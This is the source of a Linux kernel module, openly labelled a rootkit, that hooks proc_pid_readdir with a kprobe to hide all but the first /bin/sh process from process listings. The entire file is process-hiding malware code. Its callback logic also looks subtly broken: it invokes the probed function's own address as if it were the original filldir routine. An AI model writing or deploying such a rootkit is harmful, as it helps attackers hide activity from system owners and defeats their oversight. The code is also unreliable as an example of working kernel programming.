#include "kit.h"
#include <linux/kprobes.h>
#include <linux/sched.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include <linux/dcache.h>

#define TARGET_PROCESS "sh"

MODULE_LICENSE("GPL");

struct kprobe kp_proc_readdir = {
    .symbol_name = "proc_pid_readdir"
};

static int first_pid = -1;

static int fake_filldir_t(void *buf, const char *name, int namelen,
                          loff_t offset, u64 ino, unsigned d_type) {
    int pid;

    if (kstrtoint(name, 10, &pid) == 0) {
        struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);

        if (task) {
            char task_name[TASK_COMM_LEN];
            get_task_comm(task_name, task);

            if (strcmp(task_name, TARGET_PROCESS) == 0) {
                if (first_pid == -1) {
                    first_pid = pid;  // Remember the first process
                    printk(KERN_INFO "Rootkit: Keeping first /bin/sh PID: %d\n", first_pid);
                } else if (pid != first_pid) {
                    printk(KERN_INFO "Rootkit: Hiding /bin/sh PID: %d\n", pid);
                    return 0;  // Skip this process
                }
            }
        }
    }
    return ((filldir_t)kp_proc_readdir.addr)(buf, name, namelen, offset, ino, d_type);
}

static int pre_readdir_handler(struct kprobe *p, struct pt_regs *regs) {
    regs->si = (unsigned long)fake_filldir_t;
    return 0;
}

int init_psaux_hiding(void) {
    kp_proc_readdir.pre_handler = pre_readdir_handler;

    if (register_kprobe(&kp_proc_readdir) < 0) {
        printk(KERN_ERR "Rootkit: Failed to register kprobe for proc_pid_readdir\n");
        return -1;
    }

    printk(KERN_INFO "Rootkit: Kprobe for proc_pid_readdir registered\n");
    return 0;
}

void cleanup_psaux_hiding(void) {
    unregister_kprobe(&kp_proc_readdir);
    printk(KERN_INFO "Rootkit: Kprobe for proc_pid_readdir unregistered\n");
}

EXPORT_SYMBOL(init_psaux_hiding);
EXPORT_SYMBOL(cleanup_psaux_hiding);
